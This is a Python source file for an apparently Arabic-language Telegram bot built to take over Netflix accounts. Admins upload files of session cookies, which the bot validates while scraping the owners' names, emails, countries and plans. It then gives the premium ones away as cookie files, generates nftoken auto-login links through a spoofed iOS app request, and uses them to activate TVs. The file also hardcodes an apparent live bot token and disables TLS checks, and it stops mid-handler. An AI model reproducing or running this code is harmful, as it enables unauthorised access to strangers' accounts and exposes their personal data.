
# language: Python 3.11+, file: bot.py
# Netflix Bot — Premium Only + Random Pull + Fixed Ordering

# ============================================================
# PYDROID FIX
# ============================================================
import sys
import types

_fake_ap  = types.ModuleType("apscheduler")
_fake_sch = types.ModuleType("apscheduler.schedulers")
_fake_asy = types.ModuleType("apscheduler.schedulers.asyncio")
_fake_trg = types.ModuleType("apscheduler.triggers")
_fake_itv = types.ModuleType("apscheduler.triggers.interval")


class _NullSched:
    def __init__(self, *a, **k): pass
    def __getattr__(self, _): return lambda *a, **k: None
    def add_job(self, *a, **k): return None
    def remove_job(self, *a, **k): return None
    def get_jobs(self, *a, **k): return []
    def start(self, *a, **k): pass
    def shutdown(self, *a, **k): pass


_fake_asy.AsyncIOScheduler = _NullSched
_fake_asy.BackgroundScheduler = _NullSched
_fake_sch.asyncio = _fake_asy
_fake_ap.schedulers = _fake_sch

sys.modules["apscheduler"] = _fake_ap
sys.modules["apscheduler.schedulers"] = _fake_sch
sys.modules["apscheduler.schedulers.asyncio"] = _fake_asy
sys.modules["apscheduler.triggers"] = _fake_trg
sys.modules["apscheduler.triggers.interval"] = _fake_itv

# ============================================================
# IMPORTS
# ============================================================
import os
import re
import json
import logging
import requests
import io
import zipfile
import hashlib
import tempfile
import time
import asyncio
import codecs
import html as html_mod
import random
import string
import threading
from collections import OrderedDict, defaultdict
from datetime import datetime
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, InputFile
from telegram.ext import (
    ApplicationBuilder, CommandHandler, MessageHandler, CallbackQueryHandler,
    filters, ContextTypes
)
from concurrent.futures import ThreadPoolExecutor
from urllib3.exceptions import InsecureRequestWarning
import urllib.parse

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

# ============================================================
# CONFIG
# ============================================================
TOKEN = "8955205725:AAGMJi_HLFR7HCRk-2ieLHCKy_JRdfJB3u4"
OWNER_ID = 7757241009
ADMIN_IDS = [7757241009,8910414449,8409645947]

MAX_WORKERS = 20
BATCH_SIZE = 10
MAX_LIVE_HITS = 100

COOKIES_DIR = "vault"
PROXY_FILE = "proxy.txt"
REQUEST_TIMEOUT = 20
USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"

REQUIRED_COOKIES = ("NetflixId",)
OPTIONAL_COOKIES = ("SecureNetflixId", "nfvdid", "OptanonConsent")
ALL_COOKIE_NAMES = set(REQUIRED_COOKIES + OPTIONAL_COOKIES)
CANONICAL_NAMES = {name.lower(): name for name in ALL_COOKIE_NAMES}

cookie_lock = threading.Lock()
tv_stats_lock = threading.Lock()

tv_stats = {
    "total_logins": 0,
    "successful": 0,
    "failed": 0,
    "codes_rejected": 0,
    "started_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
}

NFTOKEN_API_URL = "https://ios.prod.ftl.netflix.com/iosui/user/15.48"
NFTOKEN_QUERY_PARAMS = {
    "appVersion": "15.48.1",
    "config": '{"gamesInTrailersEnabled":"false","isTrailersEvidenceEnabled":"false","cdsMyListSortEnabled":"true","kidsBillboardEnabled":"true","addHorizontalBoxArtToVideoSummariesEnabled":"false","skOverlayTestEnabled":"false","homeFeedTestTVMovieListsEnabled":"false","baselineOnIpadEnabled":"true","trailersVideoIdLoggingFixEnabled":"true","postPlayPreviewsEnabled":"false","bypassContextualAssetsEnabled":"false","roarEnabled":"false","useSeason1AltLabelEnabled":"false","disableCDSSearchPaginationSectionKinds":["searchVideoCarousel"],"cdsSearchHorizontalPaginationEnabled":"true","searchPreQueryGamesEnabled":"true","kidsMyListEnabled":"true","billboardEnabled":"true","useCDSGalleryEnabled":"true","contentWarningEnabled":"true","videosInPopularGamesEnabled":"true","avifFormatEnabled":"false","sharksEnabled":"true"}',
    "device_type": "NFAPPL-02-",
    "esn": "NFAPPL-02-IPHONE8%3D1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "idiom": "phone",
    "iosVersion": "15.8.5",
    "isTablet": "false",
    "languages": "en-US",
    "locale": "en-US",
    "maxDeviceWidth": "375",
    "model": "saget",
    "modelType": "IPHONE8-1",
    "odpAware": "true",
    "path": '["account","token","default"]',
    "pathFormat": "graph",
    "pixelDensity": "2.0",
    "progressive": "false",
    "responseFormat": "json",
}

NFTOKEN_HEADERS = {
    "User-Agent": "Argo/15.48.1 (iPhone; iOS 15.8.5; Scale/2.00)",
    "x-netflix.request.attempt": "1",
    "x-netflix.request.client.user.guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
    "x-netflix.context.profile-guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
    "x-netflix.request.routing": '{"path":"/nq/mobile/nqios/~15.48.0/user","control_tag":"iosui_argo"}',
    "x-netflix.context.app-version": "15.48.1",
    "x-netflix.argo.translated": "true",
    "x-netflix.context.form-factor": "phone",
    "x-netflix.context.sdk-version": "2012.4",
    "x-netflix.client.appversion": "15.48.1",
    "x-netflix.context.max-device-width": "375",
    "x-netflix.context.ab-tests": "",
    "x-netflix.tracing.cl.useractionid": "4DC655F2-9C3C-4343-8229-CA1B003C3053",
    "x-netflix.client.type": "argo",
    "x-netflix.client.ftl.esn": "NFAPPL-02-IPHONE8=1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "x-netflix.context.locales": "en-US",
    "x-netflix.context.top-level-uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
    "x-netflix.client.iosversion": "15.8.5",
    "accept-language": "en-US;q=1",
    "x-netflix.argo.abtests": "",
    "x-netflix.context.os-version": "15.8.5",
    "x-netflix.request.client.context": '{"appState":"foreground"}',
    "x-netflix.context.ui-flavor": "argo",
    "x-netflix.argo.nfnsm": "9",
    "x-netflix.context.pixel-density": "2.0",
    "x-netflix.request.toplevel.uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
    "x-netflix.request.client.timezoneid": "Asia/Dhaka",
}

# ============================================================
# MARKUPS
# ============================================================
START_MSG = (
    "<b>🤖 NETFLIX BOT</b>\n\n"
    "اختر من الأزرار:\n\n"
    "🍪 <b>سحب كوكي عشوائي</b> — من الخزنة\n"
    "🔗 <b>تسجيل دخول عبر رابط</b> — رابط واحد لكل ضغطة\n"
    "📺 <b>تفعيل شاشة تلفاز</b> — كود 8 أرقام"
)

def get_main_markup(uid):
    rows = [
        [InlineKeyboardButton("[ FREE COOKIES 🎉 ]", callback_data="user_pull", style="primary")],
        [InlineKeyboardButton("[ Login URL 🎬 ]", callback_data="do_linklogin", style="primary")],
        [InlineKeyboardButton("[ TV 📺  ]", callback_data="mode_tvlogin", style="primary")],
    ]
    if uid in ADMIN_IDS:
        rows.append([InlineKeyboardButton("[ ADMEN Panel ]", callback_data="admin_panel", style="primary")])
    return InlineKeyboardMarkup(rows)

def admin_markup():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("[ Combo Check ]", callback_data="admin_check", style="primary")],
        [InlineKeyboardButton("[ statistics 📊 ]", callback_data="admin_stats", style="primary")],
        [InlineKeyboardButton("[ Clear combo 🗑]", callback_data="admin_clear", style="primary")],
        [InlineKeyboardButton("[ Add ADMENS ]", callback_data="admin_promote", style="primary")],
        [InlineKeyboardButton("[ ⬅️ Return  ]", callback_data="back_home", style="primary")],
    ])

STOP_MARKUP = InlineKeyboardMarkup([
    [InlineKeyboardButton("[ Stop 🛑 ]", callback_data="stop_check", style="primary")]
])

LINKLOGIN_NEXT_MARKUP = InlineKeyboardMarkup([
    [InlineKeyboardButton("[ Next ➡️ ]", callback_data="do_linklogin")]
])

logging.basicConfig(level=logging.INFO)
log = logging.getLogger(__name__)

user_locks = defaultdict(asyncio.Lock)
user_state = {}
user_executors = {}
user_tasks = {}
dyn_admins = []

# ============================================================
# HELPERS
# ============================================================
def safe_filename(name):
    return re.sub(r'[^a-zA-Z0-9_\-\.]', '_', name)

def clean_unicode(val):
    if not isinstance(val, str): return val
    try: val = codecs.decode(val, 'unicode_escape')
    except Exception: pass
    try: val = html_mod.unescape(val)
    except Exception: pass
    val = val.encode('utf-8', errors='replace').decode('utf-8', errors='replace')
    val = ''.join(c for c in val if ord(c) >= 32 or c in '\n\r\t')
    return val

def safe_html(text):
    if not text: return "Unknown"
    text = clean_unicode(str(text))
    return text.encode('utf-8', errors='replace').decode('utf-8', errors='replace')

def dict_to_netscape(cookie_dict, domain=".netflix.com"):
    expiry = int(time.time()) + 180 * 24 * 3600
    lines = ["# Netscape HTTP Cookie File"]
    for k, v in cookie_dict.items():
        lines.append(f"{domain}\tTRUE\t/\tFALSE\t{expiry}\t{k}\t{v}")
    return "\n".join(lines)

def is_admin(uid):
    return uid in ADMIN_IDS or uid in dyn_admins

# ============================================================
# COOKIE PARSING
# ============================================================
NETFLIX_COOKIE_NAMES = {
    "NetflixId", "SecureNetflixId", "nfvdid", "OptanonConsent",
    "flwssn", "memclid", "profilesNewSession", "clSharedContext"
}


def parse_cookie_file(text):
    text = text.strip()
    results = []
    try:
        if text.startswith("{") or text.startswith("["):
            obj = json.loads(text)
            if isinstance(obj, dict):
                cd = {k: str(v) for k, v in obj.items() if k in NETFLIX_COOKIE_NAMES}
                if cd.get('NetflixId'):
                    results.append(("json_block", cd))
                if "cookies" in obj and isinstance(obj["cookies"], list):
                    m = {}
                    for c in obj["cookies"]:
                        if isinstance(c, dict) and "name" in c and "value" in c:
                            if c["name"] in NETFLIX_COOKIE_NAMES:
                                m[c["name"]] = c["value"]
                    if m.get('NetflixId'):
                        results.append(("json_cookies", m))
            elif isinstance(obj, list):
                m = {}
                for c in obj:
                    if isinstance(c, dict):
                        n = c.get("name") or c.get("key")
                        v = c.get("value")
                        if n and v and n in NETFLIX_COOKIE_NAMES:
                            m[n] = v
                if m.get('NetflixId'):
                    results.append(("json_list", m))
    except Exception:
        pass

    netscape = []
    for line in text.splitlines():
        line = line.strip()
        if not line: continue
        if line.startswith("#") and not line.startswith("#HttpOnly_"): continue
        if line.startswith("#HttpOnly_"): line = line[len("#HttpOnly_"):]
        parts = line.split("\t")
        if len(parts) >= 7 and parts[5] in NETFLIX_COOKIE_NAMES:
            netscape.append({"name": parts[5], "value": parts[6]})
    if netscape:
        nf_ids = [(i, e) for i, e in enumerate(netscape) if e["name"] == "NetflixId"]
        for nf_idx, nf_entry in nf_ids:
            cs = {"NetflixId": nf_entry["value"]}
            for e in netscape:
                if e["name"] != "NetflixId": cs[e["name"]] = e["value"]
            results.append((f"netscape_{nf_idx}", cs))
        if not nf_ids:
            m = {}
            for e in netscape: m[e["name"]] = e["value"]
            if m: results.append(("netscape_all", m))

    for line in text.splitlines():
        line = line.strip()
        if not line or line.startswith("#"): continue
        sc = {}
        for part in line.split(";"):
            part = part.strip()
            if "=" in part:
                k, v = part.split("=", 1)
                k, v = k.strip(), v.strip()
                if k in NETFLIX_COOKIE_NAMES: sc[k] = v
        if sc.get('NetflixId'):
            results.append((f"semicolon_{len(results)}", sc))

    kv = {}
    for line in text.splitlines():
        line = line.strip()
        if "=" in line and not line.startswith("#"):
            k, v = line.split("=", 1)
            k, v = k.strip(), v.strip()
            if k in NETFLIX_COOKIE_NAMES: kv[k] = v
    if kv.get('NetflixId'): results.append(("keyvalue", kv))

    nf_matches = re.findall(r'NetflixId\s*[:=]\s*([^\s;,\n"\']{20,})', text, re.IGNORECASE)
    for nf_val in nf_matches:
        nf_val = nf_val.strip('"\'')
        cs = {"NetflixId": nf_val}
        for cn in NETFLIX_COOKIE_NAMES - {"NetflixId"}:
            m = re.search(rf'{cn}\s*[:=]\s*([^\s;,\n"\']+)', text, re.IGNORECASE)
            if m: cs[cn] = m.group(1).strip('"\'')
        results.append((f"regex_{len(results)}", cs))
    return results


async def extract_cookies_from_zip(zip_path):
    cookies = []
    with zipfile.ZipFile(zip_path, 'r') as z:
        for info in z.infolist():
            if info.is_dir(): continue
            if info.filename.startswith('__MACOSX') or info.filename.startswith('.'): continue
            if info.filename.lower().endswith(('.txt', '.json')):
                with z.open(info) as f:
                    try:
                        content = f.read().decode('utf-8', errors='ignore')
                        c = parse_cookie_file(content)
                        for idx, (bn, cc) in enumerate(c):
                            cookies.append((f"{safe_filename(info.filename)}_{idx}", cc))
                    except Exception:
                        continue
    return cookies


# ============================================================
# CHECK NETFLIX COOKIE
# ============================================================
def check_netflix_cookie(cookie_dict):
    if not cookie_dict.get('NetflixId'):
        return {'ok': False, 'reason': 'No NetflixId', 'cookie': cookie_dict}
    session = requests.Session()
    session.cookies.update(cookie_dict)
    headers = {
        'User-Agent': USER_AGENT,
        'Accept': 'text/html,application/xhtml+xml',
        'Accept-Language': 'en-US,en;q=0.9',
    }
    try:
        urls = ['https://www.netflix.com/YourAccount', 'https://www.netflix.com/account']
        resp = None; txt = ""
        for url in urls:
            try:
                r = session.get(url, headers=headers, timeout=15, allow_redirects=True)
                if r.status_code == 200 and 'Account' in r.text:
                    resp = r; txt = r.text; break
            except Exception:
                continue

        if not resp or resp.status_code != 200:
            return {'ok': False, 'reason': 'conn fail', 'cookie': cookie_dict}
        if 'login' in resp.url.lower() or 'signin' in resp.url.lower():
            return {'ok': False, 'reason': 'login redirect', 'cookie': cookie_dict}

        def find(p):
            m = re.search(p, txt)
            return safe_html(m.group(1)) if m else None

        name = find(r'"accountOwnerName"\s*:\s*"([^"]+)"') or find(r'"firstName"\s*:\s*"([^"]+)"')
        plan = find(r'localizedPlanName.{1,50}?value":"([^"]+)"') or find(r'"planName"\s*:\s*"([^"]+)"')
        country = find(r'"countryOfSignup"\s*:\s*"([^"]+)"') or find(r'"currentCountry"\s*:\s*"([^"]+)"')
        email = find(r'"emailAddress"\s*:\s*"([^"]+)"') or find(r'"email"\s*:\s*"([^"]+)"')
        member_since = find(r'"memberSince":"([^"]+)"')

        ms = None
        m = re.search(r'"membershipStatus":\s*"([^"]+)"', txt)
        if m: ms = m.group(1)

        has_data = any([name, email, country, plan, ms])
        if not has_data:
            return {'ok': False, 'reason': 'no data', 'cookie': cookie_dict}

        return {
            'ok': True,
            'premium': ms == 'CURRENT_MEMBER',
            'name': name or 'Unknown',
            'email': email or 'Unknown',
            'country': country or 'Unknown',
            'plan': plan or 'Unknown',
            'member_since': member_since or 'Unknown',
            'membership_status': ms or 'Unknown',
            'cookie': cookie_dict
        }
    except Exception as e:
        return {'ok': False, 'reason': str(e)[:30], 'cookie': cookie_dict}


def generate_nftoken(cookie_dict):
    if not cookie_dict.get('NetflixId'):
        return None, "No NetflixId"
    headers = dict(NFTOKEN_HEADERS)
    headers["Cookie"] = f"NetflixId={cookie_dict['NetflixId']}"
    try:
        r = requests.get(NFTOKEN_API_URL, params=NFTOKEN_QUERY_PARAMS,
                         headers=headers, timeout=8, verify=False)
        r.raise_for_status()
        data = r.json()
        td = ((((data.get("value") or {}).get("account") or {}).get("token") or {}).get("default") or {})
        token = td.get("token")
        expires = td.get("expires")
        if not token: return None, "Dead cookie"
        if isinstance(expires, int) and len(str(expires)) == 13: expires //= 1000
        expiry = datetime.fromtimestamp(expires).strftime("%Y-%m-%d %H:%M:%S UTC") if expires else "Unknown"
        return {'token': token, 'expires': expiry}, None
    except Exception as e:
        return None, str(e)[:30]


# ============================================================
# VAULT
# ============================================================
def canonicalize_name(name):
    return CANONICAL_NAMES.get(str(name or "").strip().lower(), str(name or "").strip())


def is_netflix_cookie(domain, name):
    return canonicalize_name(name) in ALL_COOKIE_NAMES or "netflix." in str(domain or "").lower()


def extract_cookie_dict_tv(content):
    entries = {}
    for line in content.splitlines():
        line = line.strip()
        if not line: continue
        if line.startswith("#HttpOnly_"): line = line[len("#HttpOnly_"):]
        parts = line.split("\t")
        if len(parts) >= 7:
            name = canonicalize_name(parts[5])
            if is_netflix_cookie(parts[0], name):
                entries[name] = parts[6]
    if entries.get("NetflixId"): return entries

    try:
        data = json.loads(content)
        if isinstance(data, dict):
            data = data.get("cookies") or data.get("items") or [data]
        if isinstance(data, list):
            for c in data:
                if isinstance(c, dict):
                    name = canonicalize_name(c.get("name", ""))
                    if is_netflix_cookie(c.get("domain", ""), name):
                        entries[name] = str(c.get("value", ""))
    except Exception:
        pass
    if entries.get("NetflixId"): return entries

    for cn in ALL_COOKIE_NAMES:
        m = re.search(rf'{cn}\s*[:=]\s*([^\s;,\n"\']+)', content, re.IGNORECASE)
        if m: entries[cn] = m.group(1).strip('"\'')
    return entries if entries.get("NetflixId") else None


def get_vault_cookies():
    if not os.path.exists(COOKIES_DIR): return []
    return [f for f in os.listdir(COOKIES_DIR) if f.lower().endswith((".txt", ".json"))]


def count_vault_cookies():
    return len(get_vault_cookies())


def save_cookie_to_vault(name, cookie_dict):
    os.makedirs(COOKIES_DIR, exist_ok=True)
    base = safe_filename(name)
    dest = os.path.join(COOKIES_DIR, base + ".txt")
    if os.path.exists(dest):
        suf = ''.join(random.choices(string.ascii_uppercase + string.digits, k=5))
        dest = os.path.join(COOKIES_DIR, f"{base}_{suf}.txt")
    try:
        with open(dest, 'w', encoding='utf-8') as f:
            f.write(dict_to_netscape(cookie_dict))
        return True
    except Exception:
        return False


def get_random_cookie_file():
    with cookie_lock:
        files = get_vault_cookies()
        if not files: return None, None
        filename = random.choice(files)
        filepath = os.path.join(COOKIES_DIR, filename)
        try:
            with open(filepath, "r", encoding="utf-8", errors="ignore") as f:
                content = f.read()
            os.remove(filepath)
            return filename, content
        except Exception:
            return None, None


# ============================================================
# TV LOGIN
# ============================================================
def validate_cookie_tv(cookies, proxy=None):
    session = requests.Session()
    session.cookies.update(cookies)
    headers = {"User-Agent": USER_AGENT, "Accept": "text/html", "Accept-Language": "en-US,en;q=0.9"}
    try:
        r = session.get("https://www.netflix.com/YourAccount", headers=headers,
                        proxies=proxy, timeout=REQUEST_TIMEOUT, verify=False, allow_redirects=True)
        if 'login' in r.url.lower() or 'signin' in r.url.lower(): return False, None, None
        if r.status_code != 200: return False, None, None
        country = None; plan = "Unknown"
        m = re.search(r'"countryOfSignup"\s*:\s*"([^"]+)"', r.text)
        if not m: m = re.search(r'"currentCountry"\s*:\s*"([^"]+)"', r.text)
        if m: country = m.group(1)
        m = re.search(r'"localizedPlanName".*?"value":"([^"]+)"', r.text)
        if not m: m = re.search(r'"planName"\s*:\s*"([^"]+)"', r.text)
        if m: plan = m.group(1)
        has_account = 'Account' in r.text or 'membershipStatus' in r.text
        return has_account and country is not None, country, plan
    except Exception:
        return False, None, None


def extract_auth_url(html_text):
    for p in [r'name="authURL"\s+value="([^"]+)"', r'authURL["\']?\s*[:=]\s*["\']([^"]+)["\']',
              r'authURL=([^&\s"\']+)', r'value="(c1\.[^"]+)"']:
        m = re.search(p, html_text)
        if m: return urllib.parse.unquote(m.group(1))
    m = re.search(r'c1\.[a-zA-Z0-9%+=/_-]+', html_text)
    return m.group(0) if m else None


def submit_tv_code(session, tv_code, proxy=None):
    url = "https://www.netflix.com/tv8"
    headers = {"User-Agent": USER_AGENT, "Accept": "text/html", "Accept-Language": "en-US,en;q=0.9"}
    try:
        r = session.get(url, headers=headers, proxies=proxy, timeout=REQUEST_TIMEOUT, verify=False)
        if r.status_code != 200: return {"success": False, "error": "TV page down"}
    except Exception as e:
        return {"success": False, "error": str(e)[:40]}
    auth_url = extract_auth_url(r.text)
    if not auth_url: return {"success": False, "error": "no auth url"}
    post_headers = {**headers, "Content-Type": "application/x-www-form-urlencoded",
                    "Referer": "https://www.netflix.com/tv8", "Origin": "https://www.netflix.com"}
    form = {"flow": "websiteSignUp", "authURL": auth_url, "flowMode": "enterTvLoginRendezvousCode",
            "withFields": "tvLoginRendezvousCode,isTvUrl2", "code": tv_code,
            "tvLoginRendezvousCode": tv_code, "action": "nextAction"}
    try:
        r = session.post(url, data=form, headers=post_headers, proxies=proxy,
                         timeout=REQUEST_TIMEOUT, verify=False, allow_redirects=True)
    except Exception as e:
        return {"success": False, "error": str(e)[:40]}
    if "/tv/out/success" in r.url.lower(): return {"success": True, "error": None}
    text = str.lower(re.sub(r'\s+', ' ', html_mod.unescape(re.sub(r'<[^>]+>', ' ', r.text))))
    for p in [r"your tv is ready", r"successfully activated", r"tu tv est[aá] lista"]:
        if re.search(p, text): return {"success": True, "error": None}
    for p in [r"that code wasn'?t right", r"code (is )?(incorrect|invalid|wrong|expired)", r"try again"]:
        if re.search(p, text): return {"success": False, "error": "Invalid code"}
    return {"success": False, "error": "unknown"}


def process_tv_login(tv_code):
    max_attempts = min(100, max(count_vault_cookies() * 2, 30))
    attempts = 0
    tried = []
    while attempts < max_attempts:
        attempts += 1
        filename, content = get_random_cookie_file()
        if not filename: return {"success": False, "error": "no_cookies_left"}
        cookies = extract_cookie_dict_tv(content)
        if not cookies or not cookies.get('NetflixId'): continue
        valid, country, plan = validate_cookie_tv(cookies)
        if not valid: continue
        if country: tried.append(country)
        session = requests.Session()
        session.cookies.update(cookies)
        result = submit_tv_code(session, tv_code)
        result["country"] = country; result["plan"] = plan
        result["tried_countries"] = tried
        if result["success"]: return result
        if "Invalid" in str(result.get("error", "")): return result
    return {"success": False, "error": "all_failed", "tried_countries": tried}


# ============================================================
# ANIMATION
# ============================================================
BRAILLE = ["⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"]


async def animate_message(ctx, chat_id, msg_id, stop_event):
    idx = 0
    while not stop_event.is_set():
        f = BRAILLE[idx % len(BRAILLE)]
        try:
            await ctx.bot.edit_message_text(chat_id=chat_id, message_id=msg_id, text=f"{f} Searching vault...")
        except Exception:
            pass
        idx += 1
        await asyncio.sleep(0.3)


# ============================================================
# 🔥 HANDLERS — specific first, generic last
# ============================================================

async def stop_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    uid = q.from_user.id
    user_state.setdefault(uid, {})['busy'] = False
    await q.answer(" Stooped ")


async def do_linklogin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """زر توليد الرابط — معالج مخصص، يُسجّل أولاً"""
    q = update.callback_query
    chat = q.message.chat_id
    uid = q.from_user.id

    files = get_vault_cookies()
    if not files:
        await q.answer("الخزنة فارغة!", show_alert=True)
        return

    # رد فوري
    await q.answer(" With ..")

    try:
        await q.edit_message_text(
            "⏳ <b>جارٍ توليد الرابط...</b>\n\n"
            "⏱️ قد يستغرق ثواني",
            parse_mode='HTML',
            reply_markup=LINKLOGIN_NEXT_MARKUP)
    except Exception:
        pass

    # جرّب 3 ملفات بالتوازي
    sample = random.sample(files, min(3, len(files)))

    async def try_one(fname):
        fp = os.path.join(COOKIES_DIR, fname)
        try:
            with open(fp, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()
            ck = extract_cookie_dict_tv(content)
            if not ck or not ck.get('NetflixId'):
                try: os.remove(fp)
                except Exception: pass
                return None
            tok, _ = await asyncio.wait_for(
                asyncio.to_thread(generate_nftoken, ck), timeout=10
            )
            if tok:
                return {'file': fname, 'token': tok['token'], 'expires': tok['expires']}
            return None
        except Exception:
            return None

    tasks = [asyncio.create_task(try_one(f)) for f in sample]
    r = None
    try:
        for coro in asyncio.as_completed(tasks, timeout=12):
            try:
                result = await coro
                if result:
                    r = result
                    break
            except Exception:
                continue
    finally:
        for t in tasks:
            if not t.done():
                t.cancel()

    # احذف الملف المستخدم من الخزنة
    if r:
        try: os.remove(os.path.join(COOKIES_DIR, r['file']))
        except Exception: pass

    remaining = count_vault_cookies()

    if not r:
        try:
            await q.edit_message_text(
                f"❌ <b>لم يتم العثور على كوكي فعّال</b>\n\n"
                f"🍪 <b>المتبقي:</b> {remaining}",
                parse_mode='HTML',
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("🔗 حاول مجدداً", callback_data="do_linklogin", style="primary")],
                    [InlineKeyboardButton("🔙 رجوع", callback_data="back_home")],
                ]))
        except Exception:
            pass
        return

    txt = (
    
        f"━━━━━━━━━━━━━━━━━━━━━\n"
        
        f"📱 <b>phone :</b>\n"
        f"<code>https://www.netflix.com/unsupported?nftoken={r['token']}</code>\n\n"
        f"💻 <b>computer :</b>\n"
        f"<code>https://www.netflix.com/browse?nftoken={r['token']}</code>"
    )
    try:
        await q.edit_message_text(txt, parse_mode='HTML', reply_markup=LINKLOGIN_NEXT_MARKUP)
    except Exception:
        pass


async def mode_button(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """معالج عام — يستقبل باقي الأزرار"""
    q = update.callback_query
    uid = q.from_user.id
    chat = q.message.chat_id
    data = q.data

    # ============ رجوع ============
    if data == "back_home":
        user_state[uid] = {'mode': 'idle', 'cookies': [], 'busy': False}
        await q.answer()
        try:
            await q.edit_message_text(START_MSG, parse_mode='HTML', reply_markup=get_main_markup(uid))
        except Exception:
            await context.bot.send_message(chat, START_MSG, parse_mode='HTML', reply_markup=get_main_markup(uid))
        return

    if data == "noop":
        await q.answer()
        return

    # ============ 🍪 سحب كوكي عشوائي ============
    if data == "user_pull":
        await q.answer(" With ...")
        files = get_vault_cookies()
        if not files:
            await q.edit_message_text(
                "📭 <b>الخزنة فارغة</b>\n\nانتظر حتى يتم رفع الكومبو.",
                parse_mode='HTML',
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 رجوع", callback_data="back_home", style="primary")]]))
            return

        status = await q.edit_message_text("🔍 <b>جاري سحب كوكي عشوائي...</b>", parse_mode='HTML')
        stop_anim = asyncio.Event()
        asyncio.create_task(animate_message(context, chat, status.message_id, stop_anim))

        result = await asyncio.to_thread(_pull_random_cookie)
        stop_anim.set()
        await asyncio.sleep(0.3)

        if not result["ok"]:
            await status.edit_text(
                f"❌ <b>فشل السحب</b>\n\n⚠️ {result.get('error', 'unknown')}\n\n"
                f"🍪 المتبقي: <b>{count_vault_cookies()}</b>",
                parse_mode='HTML',
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("🍪 حاول مجدداً", callback_data="user_pull", style="primary")],
                    [InlineKeyboardButton("🔙 رجوع", callback_data="back_home")],
                ]))
            return

        remaining = count_vault_cookies()
        await status.edit_text(
            f"✅ <b>تم سحب كوكي صالح</b>\n\n"
            f"👤 <b>الاسم:</b> {result['name']}\n"
            f"📧 <b>الإيميل:</b> <code>{result['email']}</code>\n"
            f"🌍 <b>الدولة:</b> {result['country']}\n"
            f"📦 <b>الخطة:</b> {result['plan']}\n"
            f"📊 <b>الحالة:</b> {result['membership_status']}\n\n"
            f"🍪 <b>المتبقي:</b> {remaining}\n\n"
            f"📎 <b>تم إرسال ملف الكوكي</b>",
            parse_mode='HTML',
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🍪 كوكي آخر", callback_data="user_pull", style="primary")],
                [InlineKeyboardButton("🔙 رجوع", callback_data="back_home")],
            ]))

        file_content = dict_to_netscape(result['cookie'])
        file_buf = io.BytesIO(file_content.encode('utf-8'))
        await context.bot.send_document(
            chat,
            document=InputFile(file_buf, filename=f"premium_{int(time.time())}.txt"),
            caption=f"🍪 <b>{result['name']}</b>\n📧 <code>{result['email']}</code>",
            parse_mode='HTML')
        return

    # ============ تفعيل TV ============
    if data == "mode_tvlogin":
        await q.answer("📺 تفعيل شاشة")
        vault = count_vault_cookies()
        await q.edit_message_text(
            f"📺 <b>تفعيل شاشة تلفاز</b>\n\n"
            f"1. افتح Netflix على التلفاز\n"
            f"2. احصل على كود 8 أرقام\n"
            f"3. أرسل: <code>/tv الكود</code>\n\n"
            f"🍪 الخزنة: <b>{vault}</b>",
            parse_mode='HTML',
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 رجوع", callback_data="back_home", style="primary")]]))
        return

    # ============ لوحة الأدمن ============
    if data == "admin_panel":
        if not is_admin(uid):
            await q.answer("🚫", show_alert=True); return
        await q.answer()
        await q.edit_message_text(
            "👑 <b>لوحة الأدمن</b>\n\nاختر:",
            parse_mode='HTML', reply_markup=admin_markup())
        return

    if data == "admin_check":
        if not is_admin(uid):
            await q.answer("🚫", show_alert=True); return
        user_state[uid] = {'mode': 'check', 'cookies': [], 'busy': False}
        await q.answer("🔍")
        await q.edit_message_text(
            "🔍 <b>فحص كوكيزات (أدمن)</b>\n\n"
            "📤 ارفع ملف: <code>.txt</code> / <code>.json</code> / <code>.zip</code>\n\n"
            "⚙️ <b>سيتم:</b>\n"
            "1. فحص كل كوكي\n"
            "2. ✅ <b>بريم فقط</b> يُحفظ في الخزنة\n"
            "3. 🆓 المجاني يُتجاهل\n"
            "4. ❌ الفاسد يُتجاهل",
            parse_mode='HTML',
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 رجوع", callback_data="admin_panel", style="primary")]]))
        return

    if data == "admin_stats":
        if not is_admin(uid):
            await q.answer("🚫", show_alert=True); return
        await q.answer()
        with tv_stats_lock:
            txt = (f"📊 <b>إحصائيات</b>\n\n"
                   f"🍪 الخزنة: <b>{count_vault_cookies()}</b>\n"
                   f"🎬 محاولات TV: <b>{tv_stats['total_logins']}</b>\n"
                   f"✅ نجحت: <b>{tv_stats['successful']}</b>\n"
                   f"❌ فشلت: <b>{tv_stats['failed']}</b>\n"
                   f"🚫 أكواد خاطئة: <b>{tv_stats['codes_rejected']}</b>")
        await q.edit_message_text(txt, parse_mode='HTML',
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 رجوع", callback_data="admin_panel", style="primary")]]))
        return

    if data == "admin_clear":
        if not is_admin(uid):
            await q.answer("🚫", show_alert=True); return
        files = get_vault_cookies()
        n = len(files)
        for f in files:
            try: os.remove(os.path.join(COOKIES_DIR, f))
            except Exception: pass
